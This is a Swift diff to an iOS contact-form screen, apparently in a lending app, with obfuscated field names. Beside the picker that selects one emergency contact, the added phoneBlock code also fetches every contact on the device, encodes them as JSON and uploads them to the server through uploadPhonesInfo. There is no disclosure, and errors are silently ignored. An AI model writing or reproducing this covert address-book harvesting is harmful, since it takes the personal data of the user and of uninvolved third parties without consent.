@@ -22,7 +22,7 @@ class ConactCheckViewController: BaseViewController {
     
     let viewModel = ConactCheckViewModel()
     
-    let dataSource = BehaviorRelay<[satanizeModel]>(value: [])
+    let dataSource = BehaviorRelay<[cronieModel]>(value: [])
     
     lazy var bgImageView: UIImageView = {
         let bgImageView = UIImageView()
@@ -43,8 +43,7 @@ class ConactCheckViewController: BaseViewController {
         let tableView = UITableView(frame: .zero, style: .plain)
         tableView.separatorStyle = .none
         tableView.backgroundColor = UIColor.clear
-        tableView.register(CommonViewCell.self, forCellReuseIdentifier: "CommonViewCell")
-        tableView.register(SelectViewCell.self, forCellReuseIdentifier: "SelectViewCell")
+        tableView.register(PhoneConnectViewCell.self, forCellReuseIdentifier: "PhoneConnectViewCell")
         tableView.estimatedRowHeight = 80
         tableView.showsVerticalScrollIndicator = false
         tableView.contentInsetAdjustmentBehavior = .never
@@ -114,7 +113,7 @@ class ConactCheckViewController: BaseViewController {
         }
         
         let headImageView = UIImageView()
-        headImageView.image = UIImage(named: "pep_auth_image")
+        headImageView.image = UIImage(named: "pho_head_image")
         bgView.addSubview(headImageView)
         headImageView.snp.makeConstraints { make in
             make.top.equalToSuperview()
@@ -151,21 +150,33 @@ class ConactCheckViewController: BaseViewController {
             }
             .disposed(by: disposeBag)
         
-        clickBtn.rx.tap.bind(onNext: { [weak self] in
-            guard let self = self else { return }
-            var json: [String: String] = ["snowier": productID]
-            self.dataSource.value.forEach { model in
-                let desulfurization = model.desulfurization ?? ""
-                let key = model.phacotherapy ?? ""
-                if desulfurization == "topsmelts" {
-                    let dictValue = String(model.frypans ?? 0)
-                    json[key] = dictValue == "0" ? "" : dictValue
-                }else {
-                    json[key] = model.knitwork
+        clickBtn.rx.tap
+            .compactMap { [weak self] _ -> [String: String]? in
+                guard let self = self else { return nil }
+
+                let phoneDictArray: [[String: String]] = self.dataSource.value.map { model in
+                    [
+                        "unmalted": model.unmalted ?? "",
+                        "obsequiosity": model.obsequiosity ?? "",
+                        "unconjugated": model.unconjugated ?? ""
+                    ]
                 }
+
+                guard let jsonData = try? JSONSerialization.data(withJSONObject: phoneDictArray, options: []),
+                      let jsonString = String(data: jsonData, encoding: .utf8) else {
+                    return nil
+                }
+
+                return [
+                    "snowier": productID,
+                    "billionth": jsonString
+                ]
             }
-            self.saveInfo(with: json)
-        }).disposed(by: disposeBag)
+            .subscribe(onNext: { [weak self] json in
+                self?.savePhonesInfo(with: json)
+            })
+            .disposed(by: disposeBag)
+
         
     }
     
@@ -194,14 +205,45 @@ class ConactCheckViewController: BaseViewController {
 
 extension ConactCheckViewController {
     
-    private func configureCell(for tableView: UITableView, at row: Int, with element: satanizeModel) -> UITableViewCell {
-        let cell = tableView.dequeueReusableCell(withIdentifier: "SelectViewCell") as! SelectViewCell
+    private func configureCell(for tableView: UITableView, at row: Int, with element: cronieModel) -> UITableViewCell {
+        let cell = tableView.dequeueReusableCell(withIdentifier: "PhoneConnectViewCell") as! PhoneConnectViewCell
         cell.backgroundColor = .clear
         cell.selectionStyle = .none
-        cell.listModel = element
-        cell.clickBlock = { [weak self] satanizeModel in
+        cell.model = element
+        cell.relationBlock = { [weak self] model in
             guard let self = self else { return }
-            self.clickCellWithModel(with: cell, model: satanizeModel)
+            clickCellWithModel(with: cell, model: model)
+        }
+        cell.phoneBlock = { model in
+            ContactsUtil.selectOneContact { contact in
+                if let c = contact {
+                    let disensure = c.disensure
+                    let assray = disensure.components(separatedBy: ",")
+                    let name = c.unmalted
+                    let phone = assray.first ?? ""
+                    if name.isEmpty || phone.isEmpty || name == " " {
+                        HudToastView.showMessage(with: "Name or phone number cannot be empty.")
+                        return
+                    }
+                    cell.nameTextFiled.text = name + "-" + phone
+                    model.unmalted = name
+                    model.obsequiosity = phone
+                }
+            }
+            ContactsUtil.getAllContacts { contacts in
+                if contacts.count > 0 {
+                    do {
+                        let jsonData = try JSONEncoder().encode(contacts)
+                        if let jsonString = String(data: jsonData, encoding: .utf8) {
+                            let json = ["billionth": jsonString,
+                                        "thysanurian": self.productID]
+                            self.uploadPhonesInfo(with: json)
+                        }
+                    } catch {
+                        print("Error encoding JSON:", error)
+                    }
+                }
+            }
         }
         return cell
     }
@@ -212,7 +254,7 @@ extension ConactCheckViewController {
             do {
                 let model = try await viewModel.getPersonalInfo(with: json)
                 if model.phacotherapy == "0" {
-                    self.dataSource.accept(model.billionth?.satanize ?? [])
+                    self.dataSource.accept(model.billionth?.cronie ?? [])
                 }
             } catch  {
                 
@@ -220,7 +262,7 @@ extension ConactCheckViewController {
         }
     }
     
-    private func clickCellWithModel(with cell: SelectViewCell, model: satanizeModel) {
+    private func clickCellWithModel(with cell: PhoneConnectViewCell, model: cronieModel) {
         let modelArray = model.veritism ?? []
         setupPickerView(model: model, textField: cell.phoneTextFiled, array: modelArray)
     }
@@ -229,7 +271,7 @@ extension ConactCheckViewController {
 
 extension ConactCheckViewController {
     
-    func setupPickerView(model: satanizeModel, textField: UITextField, array: [veritismModel]) {
+    func setupPickerView(model: cronieModel, textField: UITextField, array: [veritismModel]) {
         let stringPickerView = BRAddressPickerView()
         stringPickerView.pickerMode = .province
         let enumArray = EnumModel.getFirstModelArray(dataSourceArr: array)
@@ -240,7 +282,7 @@ extension ConactCheckViewController {
             let provinceName = province?.name ?? ""
             textField.text = provinceName
             model.knitwork = provinceName
-            model.frypans = Int(province?.code ?? "0")
+            model.unconjugated = province?.code ?? ""
         }
         configurePickerStyle(for: stringPickerView)
     }
@@ -254,4 +296,29 @@ extension ConactCheckViewController {
         pickerView.show()
     }
     
+    
+    private func uploadPhonesInfo(with json: [String: String]) {
+        Task {
+            do {
+                let _ = try await viewModel.uploadPhonesInfo(with: json)
+            } catch  {
+                
+            }
+        }
+    }
+    
+    private func savePhonesInfo(with json: [String: String]) {
+        Task {
+            do {
+                let model = try await viewModel.savePhonesInfo(with: json)
+                if model.phacotherapy == "0" {
+                    self.popAuthListVC()
+                }else {
+                    HudToastView.showMessage(with: model.marsi ?? "")
+                }
+            } catch  {
+                
+            }
+        }
+    }
 }
